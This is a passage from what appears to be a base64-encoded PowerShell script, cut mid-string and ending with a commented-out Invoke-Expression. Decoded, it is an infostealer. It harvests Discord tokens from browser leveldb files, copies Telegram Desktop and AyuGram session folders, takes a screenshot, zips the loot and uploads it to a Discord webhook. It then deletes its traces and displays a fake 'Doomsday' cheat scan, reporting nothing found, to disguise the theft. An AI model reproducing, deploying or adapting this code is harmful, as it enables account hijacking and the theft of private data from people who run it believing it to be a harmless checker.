zID0gQCgpDQoNCmZvcmVhY2ggKCR0YXJnZXQgaW4gJGRzY190YXJnZXRzKSB7DQogICAgJGxldmVsZGJQYXRoID0gSm9pbi1QYXRoICR0YXJnZXQgIkxvY2FsIFN0b3JhZ2VcbGV2ZWxkYiINCg0KICAgIGlmIChUZXN0LVBhdGggJGxldmVsZGJQYXRoKSB7DQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGxldmVsZGJQYXRoIC1GaWx0ZXIgIioubGRiIiAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRmaWxlQ29udGVudCA9IEdldC1Db250ZW50ICRfLkZ1bGxOYW1lIC1SYXcNCiAgICAgICAgICAgIGZvcmVhY2ggKCRyZWdleCBpbiAkZHNjX3JlZ2V4ZXMpIHsNCiAgICAgICAgICAgICAgICAkbWF0Y2hlcyA9IFtyZWdleF06Ok1hdGNoZXMoJGZpbGVDb250ZW50LCAkcmVnZXgpDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJG1hdGNoIGluICRtYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgICRkc2NfdG9rZW5zICs9ICRtYXRjaC5WYWx1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGxldmVsZGJQYXRoIC1GaWx0ZXIgIioubG9nIiAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRmaWxlQ29udGVudCA9IEdldC1Db250ZW50ICRfLkZ1bGxOYW1lIC1SYXcNCiAgICAgICAgICAgIGZvcmVhY2ggKCRyZWdleCBpbiAkZHNjX3JlZ2V4ZXMpIHsNCiAgICAgICAgICAgICAgICAkbWF0Y2hlcyA9IFtyZWdleF06Ok1hdGNoZXMoJGZpbGVDb250ZW50LCAkcmVnZXgpDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJG1hdGNoIGluICRtYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgICRkc2NfdG9rZW5zICs9ICRtYXRjaC5WYWx1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KaWYgKCRkc2NfdG9rZW5zIC1hbmQgJGRzY190b2tlbnMuQ291bnQgLWd0IDApIHsNCiAgICAkZmlsZVBhdGggPSBKb2luLVBhdGggJGVudjpUZW1wICJkaXNjb3JkX3Rva2Vucy50eHQiDQogICAgJGRzY190b2tlbnMgfCBPdXQtRmlsZSAtRmlsZVBhdGggJGZpbGVQYXRoIC1FbmNvZGluZyBVVEY4DQp9DQoNCiMjIC0tLSAvLyBaaXAgQXJjaGl2ZSAmIFRlbXAgRm9sZGVyIENyZWF0aW5nIFxcIC0tLSAjIw0KaWYgKFRlc3QtUGF0aCAkemlwRmlsZVBhdGgpIHsNCiAgICBSZW1vdmUtSXRlbSAkemlwRmlsZVBhdGggLUZvcmNlDQp9DQoNCiR0ZW1wRm9sZGVyID0gSm9pbi1QYXRoICRlbnY6VGVtcCAidGVtcFppcEZvbGRlciINCmlmIChUZXN0LVBhdGggJHRlbXBGb2xkZXIpIHsNCiAgICBSZW1vdmUtSXRlbSAkdGVtcEZvbGRlciAtUmVjdXJzZSAtRm9yY2UNCn0NCk5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHRlbXBGb2xkZXIgfCBPdXQtTnVsbA0KDQojIyAtLS0gLy8gZm9yZWFjaCBwYXRocyBcXCAtLS0gIyMNCiR0b3RhbEZpbGVzID0gMDsNCmZvcmVhY2ggKCRmb2xkZXJOYW1lIGluICRmaWxlUGF0aHMuS2V5cykgew0KICAgICRwYXRocyA9ICRmaWxlUGF0aHNbJGZvbGRlck5hbWVdICMgIkB7cGF0aHN9Ig0KICAgICRmb2xkZXJOYW1lID0gJGZvbGRlck5hbWUgKyAiXCINCiAgICBmb3JlYWNoICgkZmlsZVBhdGggaW4gJHBhdGhzLktleXMpIHsNCiAgICAgICAgJGNvcHlOYW1lID0gJHBhdGhzWyRmaWxlUGF0aF0gIyAiYWNjb3VudHMuanNvbiINCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkZmlsZVBhdGgpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJGZvbGRlclBhdGggPSBKb2luLVBhdGggLVBhdGggJHRlbXBGb2xkZXIgLUNoaWxkUGF0aCAkZm9sZGVyTmFtZQ0KICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGZvbGRlclBhdGgpIHt9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRmb2xkZXJQYXRoIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGRlc3RpbmF0aW9uUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZm9sZGVyUGF0aCAtQ2hpbGRQYXRoICRjb3B5TmFtZQ0KICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGZpbGVQYXRoIC1EZXN0aW5hdGlvbiAkZm9sZGVyUGF0aCAtRm9yY2UNCiAgICAgICAgICAgICAgICAkdG90YWxGaWxlcyA9ICR0b3RhbEZpbGVzICsgMQ0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgU2VuZC1XZWJob29rIC1UZXh0ICLQntGI0LjQsdC60LAg0LrQvtC/0LjRgNC+0LLQsNC90LjRjyDRhNCw0LnQu9CwICckZmlsZVBhdGgnOiAkXyINCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFNlbmQtV2ViaG9vayAtVGV4dCAi0KTQsNC50LsgJyRmaWxlUGF0aCcg0L3QtSDQvdCw0LnQtNC10L0g0L/QviDRgtCw0LrQvtC80YMg0L/Rg9GC0LgiDQogICAgICAgIH0NCiAgICB9DQp9DQokdG90YWxOYW1lID0gItCS0YHQtdCz0L4g0YHQv9C40LfQttC10L3QvdC+INGE0LDQudC70L7QsiDigJQgIiArICR0b3RhbEZpbGVzDQokdG90YWxQYXRoID0gSm9pbi1QYXRoIC1QYXRoICR0ZW1wRm9sZGVyIC1DaGlsZFBhdGggJHRvdGFsTmFtZQ0KTmV3LUl0ZW0gLUl0ZW1UeXBlIEZpbGUgLVBhdGggJHRvdGFsUGF0aCB8IE91dC1OdWxsDQoNCiMjIyAtLS0gLy8gUHJvY2VzcyBcXCAtLS0gIyMjDQokb3V0cHV0UGF0aCA9ICIkdGVtcEZvbGRlclxTY3JlZW5zaG90LmpwZyIKCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcKCiRzY3JlZW5XaWR0aCA9IFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5TY3JlZW5dOjpQcmltYXJ5U2NyZWVuLkJvdW5kcy5XaWR0aAokc2NyZWVuSGVpZ2h0ID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLlNjcmVlbl06OlByaW1hcnlTY3JlZW4uQm91bmRzLkhlaWdodAokYml0bWFwID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5CaXRtYXAgJHNjcmVlbldpZHRoLCAkc2NyZWVuSGVpZ2h0CgokZ3JhcGhpY3MgPSBbU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGJpdG1hcCkKJGdyYXBoaWNzLkNvcHlGcm9tU2NyZWVuKDAsIDAsIDAsIDAsICRiaXRtYXAuU2l6ZSkKCiRiaXRtYXAuU2F2ZSgkb3V0cHV0UGF0aCwgW1N5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VGb3JtYXRdOjpKcGVnKQoKJGdyYXBoaWNzLkRpc3Bvc2UoKQ0KDQojIyAtLS0gLy8gVEVMRUdSQU0gfCBUREFUQSBcXCAtLS0gIyMNCiR0ZGF0YSA9ICIkcm9hbWluZ1xUZWxlZ3JhbSBEZXNrdG9wXHRkYXRhIg0KJHRkYXRhcyA9IEAoDQogICAgIiRyb2FtaW5nXFRlbGVncmFtIERlc2t0b3BcdGRhdGEiLA0KICAgICIkdXNlclxPbmVEcml2ZVxEb3dubG9hZHNcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YSIsDQogICAgIiR1c2VyXERvd25sb2Fkc1xUZWxlZ3JhbSBEZXNrdG9wXHRkYXRhIiwNCiAgICAiRDpcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YSIsDQogICAgIkQ6XEF5dUdyYW0gRGVza3RvcFx0ZGF0YSIsDQogICAgIkQ6XHRkYXRhIiwNCiAgICAiJHJvYW1pbmdcQXl1R3JhbSBEZXNrdG9wXHRkYXRhIiwNCiAgICAiJHVzZXJcT25lRHJpdmVcRG93bmxvYWRzXHRkYXRhIiwNCiAgICAiJHVzZXJcRG93bmxvYWRzXEF5dUdyYW0gRGVza3RvcFx0ZGF0YSINCikNCmZvcmVhY2ggKCR0cnlUZGF0YSBpbiAkdGRhdGFzKSB7DQogICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkdHJ5VGRhdGEpIHsNCiAgICAgICAgJHRkYXRhID0gJHRyeVRkYXRhDQogICAgfQ0KfQ0KDQokdERhdGFQYXRoID0gJHRkYXRhDQokZGVzdGluYXRpb24gPSAiJHRlbXBGb2xkZXJcVGVsZWdyYW0gRGVza3RvcFx0ZGF0YSINCiMg0J/RgNC+0LLQtdGA0Y/QtdC8INGB0YPRidC10YHRgtCy0L7QstCw0L3QuNC1INC/0LDQv9C60LggdGRhdGENCmlmIChUZXN0LVBhdGggLVBhdGggJHREYXRhUGF0aCkgew0KICAgICMg0KHQv9C40YHQvtC6INGE0LDQudC70L7QsiDQuCDQv9Cw0L/QvtC6INCyIHRkYXRhDQogICAgJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkdERhdGFQYXRoIC1GaWxlDQogICAgJGRpcnMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICR0RGF0YVBhdGggLURpcmVjdG9yeQ0KDQogICAgIyDQn9GD0YLRjCDQuiBrZXlfZGF0YXMNCiAgICAka2V5RGF0YXNQYXRoID0gSm9pbi1QYXRoIC1QYXRoICR0RGF0YVBhdGggLUNoaWxkUGF0aCAia2V5X2RhdGFzIg0KICAgICRsb2dpblBhdGhzID0gQCgpDQogICAgJGhhc19rZXlfZGF0YXMgPSAkZmFsc2UNCiAgICANCiAgICAjINCf0YDQvtCy0LXRgNGP0LXQvCDQvdCw0LvQuNGH0LjQtSBrZXlfZGF0YXMNCiAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRrZXlEYXRhc1BhdGgpIHsNCiAgICAgICAgJGhhc19rZXlfZGF0YXMgPSAkdHJ1ZQ0KICAgICAgICAkbG9naW5QYXRocyArPSAka2V5RGF0YXNQYXRoDQogICAgfQ0KDQogICAgIyDQodC+0L/QvtGB0YLQsNCy0LvRj9C10Lwg0YTQsNC50LvRiyDQuCDQv9Cw0L/QutC4DQogICAgZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7DQogICAgICAgIGZvcmVhY2ggKCRkaXIgaW4gJGRpcnMpIHsNCiAgICAgICAgICAgIGlmICgkZmlsZS5OYW1lIC1lcSAkZGlyLk5hbWUgKyAicyIpIHsNCiAgICAgICAgICAgICAgICAkbG9naW5QYXRocyArPSAkZmlsZS5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgICRsb2dpblBhdGhzICs9ICRkaXIuRnVsbE5hbWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMg0JXRgdC70Lgg0L3QsNC50LTQtdC90YsgbG9naW5QYXRocyDQuCBrZXlfZGF0YXMNCiAgICBpZiAoJGhhc19rZXlfZGF0YXMgLWFuZCAoJGxvZ2luUGF0aHMuQ291bnQgLWd0IDEpKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAjINCh0L7Qt9C00LDQtdC8INGG0LXQu9C10LLRg9GOINC/0LDQv9C60YMNCiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGRlc3RpbmF0aW9uKSkgew0KICAgICAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGRlc3RpbmF0aW9uIHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgIyDQmtC+0L/QuNGA0YPQtdC8INGE0LDQudC70Ysg0Lgg0L/QsNC/0LrQuA0KICAgICAgICAgICAgZm9yZWFjaCAoJGl0ZW0gaW4gJGxvZ2luUGF0aHMpIHsNCiAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRpdGVtIC1QYXRoVHlwZSBMZWFmKSB7DQogICAgICAgICAgICAgICAgICAgICMg0JrQvtC/0LjRgNGD0LXQvCDRhNCw0LnQuw0KICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGl0ZW0gLURlc3RpbmF0aW9uIChKb2luLVBhdGggLVBhdGggJGRlc3RpbmF0aW9uIC1DaGlsZFBhdGggKFNwbGl0LVBhdGggLUxlYWYgJGl0ZW0pKQ0KICAgICAgICAgICAgICAgIH0gZWxzZWlmIChUZXN0LVBhdGggLVBhdGggJGl0ZW0gLVBhdGhUeXBlIENvbnRhaW5lcikgew0KICAgICAgICAgICAgICAgICAgICAjINCa0L7Qv9C40YDRg9C10Lwg0L/QsNC/0LrRgw0KICAgICAgICAgICAgICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGl0ZW0gLURlc3RpbmF0aW9uIChKb2luLVBhdGggLVBhdGggJGRlc3RpbmF0aW9uIC1DaGlsZFBhdGggKFNwbGl0LVBhdGggLUxlYWYgJGl0ZW0pKSAtUmVjdXJzZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgU2VuZC1XZWJob29rIC1UZXh0ICLQpNCw0LnQu9GLINC4INC/0LDQv9C60Lgg0YPRgdC/0LXRiNC90L4g0YHQutC+0L/QuNGA0L7QstCw0L3Riy4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICBTZW5kLVdlYmhvb2sgLVRleHQgItCe0YjQuNCx0LrQsCDQv9GA0Lgg0LrQvtC/0LjRgNC+0LLQsNC90LjQuDogJF8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgIH0NCiAgICB9DQp9DQoNCiRmaWxlUGF0aHNzc3MgPSBAKA0KICAgICIkdGRhdGFca2V5X2RhdGFzLmJpbiIsDQogICAgIiR0ZGF0YVxzZXR0aW5nc3MiLA0KICAgICIkdGRhdGFcdXNlcnRhZyINCikNCg0KZm9yZWFjaCAoJGYyIGluICRmaWxlUGF0aHNzc3MpIHsNCiAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRmMiAtUGF0aFR5cGUgTGVhZikgew0KICAgICAgICBDb3B5LUl0ZW0gLVBhdGggJGYyIC1EZXN0aW5hdGlvbiAkZGVzdGluYXRpb24NCiAgICB9IGVsc2VpZiAoVGVzdC1QYXRoIC1QYXRoICRmMiAtUGF0aFR5cGUgQ29udGFpbmVyKSB7DQogICAgICAgIENvcHktSXRlbSAtUGF0aCAkZjIgLURlc3RpbmF0aW9uICRkZXN0aW5hdGlvbiAtUmVjdXJzZQ0KICAgIH0NCn0NCg0KIyMgLS0tIC8vIFpJUCBBUkNISVZFIENSRUFUSU5HIFxcIC0tLSAjIw0KdHJ5IHsNCiAgICBDb21wcmVzcy1BcmNoaXZlIC1QYXRoICIkdGVtcEZvbGRlclwqIiAtRGVzdGluYXRpb25QYXRoICR6aXBGaWxlUGF0aCAtRm9yY2UNCn0gY2F0Y2ggew0KICAgIHJldHVybg0KfQ0KDQoNCiMjIC0tLSAvLyBEaXNjb3JkIFdlYmhvb2sgXFwgLS0tICMjDQppZigkdXNlck5hbWUgLWVxICJhbmRybyIpIHsNCg0KfSBlbHNlIHsNCiAgICB0cnkgew0KICAgICAgICAkaHR0cENsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5IdHRwLkh0dHBDbGllbnQNCiAgICAgICAgJGZvcm1EYXRhID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuTXVsdGlwYXJ0Rm9ybURhdGFDb250ZW50DQoNCiAgICAgICAgJHN0cmluZ0NvbnRlbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSHR0cC5TdHJpbmdDb250ZW50KCI+INCa0YLQvi3RgtC+INC/0L7Qv9Cw0LvRgdGPINCyINC70L7QstGD0YjQtdGH0LrRgyDQrl/RjiIpDQogICAgICAgICRmb3JtRGF0YS5BZGQoJHN0cmluZ0NvbnRlbnQsICJjb250ZW50IikNCg0KICAgICAgICAkZmlsZVN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKCR6aXBGaWxlUGF0aCkNCiAgICAgICAgJGZpbGVDb250ZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0Lkh0dHAuU3RyZWFtQ29udGVudCgkZmlsZVN0cmVhbSkNCiAgICAgICAgJGZpbGVDb250ZW50LkhlYWRlcnMuQ29udGVudFR5cGUgPSBbU3lzdGVtLk5ldC5IdHRwLkhlYWRlcnMuTWVkaWFUeXBlSGVhZGVyVmFsdWVdOjpQYXJzZSgiYXBwbGljYXRpb24vemlwIikNCiAgICAgICAgJGZvcm1EYXRhLkFkZCgkZmlsZUNvbnRlbnQsICJmaWxlIiwgJHVzZXJOYW1lICsgIl9kYXRhLnppcCIpDQoNCiAgICAgICAgJHJlc3BvbnNlID0gJGh0dHBDbGllbnQuUG9zdEFzeW5jKCRXZWJob29rX2xpbmssICRmb3JtRGF0YSkuUmVzdWx0DQoNCiAgICAgICAgaWYgKC1Ob3QgJHJlc3BvbnNlLklzU3VjY2Vzc1N0YXR1c0NvZGUpIHsNCiAgICAgICAgICAgIFdyaXRlLUVycm9yICJGYWlsZWQgdG8gc2VuZCBaSVAgYXJjaGl2ZS4gSFRUUCBzdGF0dXM6ICQoJHJlc3BvbnNlLlN0YXR1c0NvZGUpIg0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgIFdyaXRlLUVycm9yICJFcnJvciBzZW5kaW5nIFpJUCBhcmNoaXZlOiAkXyINCiAgICB9DQp9DQoNCg0KIyMgLS0tIC8vIEVuZGluZyAmIFZpc3VhbCBcXCAtLS0gIyMNClJlbW92ZS1JdGVtICR6aXBGaWxlUGF0aCAtRm9yY2UNCiRhYWExMjMgPSAiJGVudjpURU1QXGRpc2NvcmRfdG9rZW5zLnR4dCINCmlmIChUZXN0LVBhdGggLVBhdGggJGFhYTEyMykgew0KICAgIFJlbW92ZS1JdGVtICIkZW52OlRFTVBcZGlzY29yZF90b2tlbnMudHh0IiAtRm9yY2UNCn0NCldyaXRlLU91dHB1dCAi4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCU4oCUIg0KV3JpdGUtT3V0cHV0ICIgIg0KV3JpdGUtT3V0cHV0ICIgQCBDdXJyZW50IHRhc2s6ICAgIFNjYW5uaW5nIEM6XCBmb3IgRG9vbXNkYXkiDQokcHJvZ3Jlc3NCYXJMZW5ndGggPSA1MA0KJGkgPSAwDQpmb3IgKDsgJGkgLWxlICRwcm9ncmVzc0Jhckxlbmd0aDsgJGkrKykgew0KICAgICRwcm9ncmVzc0JhciA9ICJbIiArICgiPSIgKiAkaSkuUGFkUmlnaHQoJHByb2dyZXNzQmFyTGVuZ3RoKSArICJdIg0KICAgIFdyaXRlLUhvc3QgLU5vTmV3bGluZSAiYHIkcHJvZ3Jlc3NCYXIgKCQoW21hdGhdOjpSb3VuZCgoJGkgLyAkcHJvZ3Jlc3NCYXJMZW5ndGgpICogMTAwKSkpJSINCiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDIwMA0KfQ0KV3JpdGUtT3V0cHV0ICIgIg0KV3JpdGUtT3V0cHV0ICLigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJQiDQoNCldyaXRlLU91dHB1dCAiICINCldyaXRlLUhvc3QgIlN0b3BwZWQuIERvb21zZGF5INC4INC/0YDQvtGH0LjQtSDRgdC60YDRi9GC0YvQtSDQn9CeINC90LUg0L3QsNC50LTQtdC90YsiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCg0KUGF1c2UNClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDINCmV4aXQNCg0K"))
#Invoke-Expression $ASJF7087hD28C01H64Cm132864cnH1N947981
